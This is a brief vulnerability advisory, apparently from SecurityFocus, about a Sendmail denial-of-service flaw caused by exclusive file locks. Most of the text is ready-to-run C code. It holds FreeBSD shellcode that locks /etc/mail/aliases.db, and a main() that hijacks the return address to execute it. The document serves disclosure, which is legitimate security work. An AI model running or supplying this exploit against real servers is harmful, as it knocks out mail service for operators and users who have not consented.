source: http://www.securityfocus.com/bid/4822/info

Sendmail is a MTA for Unix and Linux variants.

There is a vulnerability in Sendmail that will lead to a denial of service condition. The vulnerability occurs when a malicious user acquires an exclusive lock on files that Sendmail requires for operation. 

/*

FreeBSD Sendmail DoS shellcode that locks /etc/mail/aliases.db
Written by zillion (at http://www.safemode.org && http://www.snosoft.com)

More info: http://www.sendmail.org/LockingAdvisory.txt

*/

char shellcode[] =
        "\xeb\x1a\x5e\x31\xc0\x88\x46\x14\x50\x56\xb0\x05\x50\xcd\x80"
        "\x6a\x02\x50\xb0\x83\x50\xcd\x80\x80\xe9\x03\x78\xfe\xe8\xe1"
        "\xff\xff\xff\x2f\x65\x74\x63\x2f\x6d\x61\x69\x6c\x2f\x61\x6c"
        "\x69\x61\x73\x65\x73\x2e\x64\x62";

int main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}